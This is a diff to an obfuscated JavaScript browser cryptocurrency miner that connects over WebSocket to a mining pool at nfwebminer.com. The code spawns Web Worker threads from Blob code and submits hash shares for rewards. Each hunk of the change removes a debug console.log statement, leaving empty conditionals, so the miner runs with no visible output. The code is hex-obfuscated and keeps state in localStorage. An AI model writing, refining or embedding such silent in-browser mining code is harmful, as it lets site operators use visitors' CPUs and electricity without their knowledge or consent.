@@ -1,3 +1,5 @@
+"use strict";
+
 function Miner(_0x57f6x1, _0x57f6x2) {
   "use strict";
 
@@ -52,9 +54,7 @@ function Miner(_0x57f6x1, _0x57f6x2) {
   var _0x57f6x1b = Math["random"]() * 0xffffffff | 0;
   var _0x57f6x1c = "nfwebminer.com";
   var _0x57f6x1d = true;
-  if (_0x57f6x18) {
-    console["log"]("ID: " + _0x57f6x1b + "; useAsmJs: " + _0x57f6x12 + "; threads: " + _0x57f6x5);
-  };
+  if (_0x57f6x18) {};
   window["addEventListener"]("unload", function (_0x57f6x1e) {
     var _0x57f6x1f = localStorage["getItem"]("nfwebminer");
     if (_0x57f6x1f) {
@@ -76,9 +76,7 @@ function Miner(_0x57f6x1, _0x57f6x2) {
     return _0x57f6xe;
   };
   this["start"] = function () {
-    if (_0x57f6x18) {
-      console["log"]("this.statt!");
-    };
+    if (_0x57f6x18) {};
     if (_0x57f6xe) {
       _0x57f6xf = false;
       return;
@@ -95,9 +93,7 @@ function Miner(_0x57f6x1, _0x57f6x2) {
           }
         }
       } catch (e) {
-        if (this["_debug"]) {
-          console["log"](e);
-        }
+        if (this["_debug"]) {}
       }
     };
     localStorage["setItem"]("nfwebminer", JSON["stringify"]({
@@ -189,9 +185,7 @@ function Miner(_0x57f6x1, _0x57f6x2) {
     };
     for (i = _0x57f6x7; i < _0x57f6x5; i++) {
       var _0x57f6x2a;
-      if (_0x57f6x18) {
-        console["log"]("create worker!  " + _0x57f6x28);
-      };
+      if (_0x57f6x18) {};
       var _0x57f6x2b = workerFunction.toString();
       _0x57f6x2b = _0x57f6x2b["substring"](_0x57f6x2b["indexOf"]("{") + 1, _0x57f6x2b["lastIndexOf"]("}"));
       _0x57f6x2a = new Blob([_0x57f6x2b], {
@@ -202,9 +196,7 @@ function Miner(_0x57f6x1, _0x57f6x2) {
       var _0x57f6x2c = _0x57f6x28++;
       _0x57f6x6[_0x57f6x2c] = _0x57f6x27;
       _0x57f6x27["onerror"] = function (_0x57f6x2d) {
-        if (_0x57f6x18) {
-          console["log"]("Worker.onerror: ", _0x57f6x2d);
-        }
+        if (_0x57f6x18) {}
       };
       _0x57f6x27["onmessage"] = function (_0x57f6x2d) {
         var _0x57f6x2e = _0x57f6x27;
@@ -223,9 +215,7 @@ function Miner(_0x57f6x1, _0x57f6x2) {
             if (_0x57f6x2d["data"]["cmd"] == "share") {
               var _0x57f6x2f = hexToString(_0x57f6x2d["data"]["nonce"]);
               var _0x57f6x30 = Uint32Array2hex(_0x57f6x2d["data"]["hash"], 8);
-              if (_0x57f6x18) {
-                console["log"]("Share found: " + _0x57f6x2f + " -> " + _0x57f6x30);
-              };
+              if (_0x57f6x18) {};
               var _0x57f6x31 = {
                 command: "share",
                 nonce: _0x57f6x2f,
@@ -284,9 +274,7 @@ function Miner(_0x57f6x1, _0x57f6x2) {
       _0x57f6x11["send"](JSON["stringify"](_0x57f6x31));
     };
     _0x57f6x11["onclose"] = function (_0x57f6x1e) {
-      if (_0x57f6x18) {
-        console["log"]("WebSocket.onclose: " + _0x57f6x1e);
-      };
+      if (_0x57f6x18) {};
       _0x57f6x32 = Math["min"](_0x57f6x32 + 20, 200);
       if (_0x57f6x32 > 40) {
         _0x57f6x1d = !_0x57f6x1d;
@@ -302,14 +290,10 @@ function Miner(_0x57f6x1, _0x57f6x2) {
       }
     };
     _0x57f6x11["onerror"] = function (_0x57f6x1e) {
-      if (_0x57f6x18) {
-        console["log"]("WebSocket.onerror: " + _0x57f6x1e);
-      }
+      if (_0x57f6x18) {}
     };
     _0x57f6x11["onmessage"] = function (_0x57f6x39) {
-      if (_0x57f6x18) {
-        console["log"]("WebSocket.onmessage:", _0x57f6x39);
-      };
+      if (_0x57f6x18) {};
       var _0x57f6x31 = JSON["parse"](_0x57f6x39["data"]);
       if (_0x57f6x31["command"] == "work") {
         _0x57f6x9 = new Uint32Array(19);
@@ -326,14 +310,10 @@ function Miner(_0x57f6x1, _0x57f6x2) {
         }
       } else {
         if (_0x57f6x31["command"] == "error") {
-          if (_0x57f6x18) {
-            console["log"]("Error: code:" + _0x57f6x31["errorCode"] + " message:" + _0x57f6x31["errorMessage"]);
-          }
+          if (_0x57f6x18) {}
         } else {
           if (_0x57f6x31["command"] == "accepted") {
-            if (_0x57f6x18) {
-              console["log"]("Share accepted! reward:" + _0x57f6x31["reward"]);
-            };
+            if (_0x57f6x18) {};
             if (_0x57f6x17) {
               _0x57f6x17(_0x57f6x31["reward"]);
             }
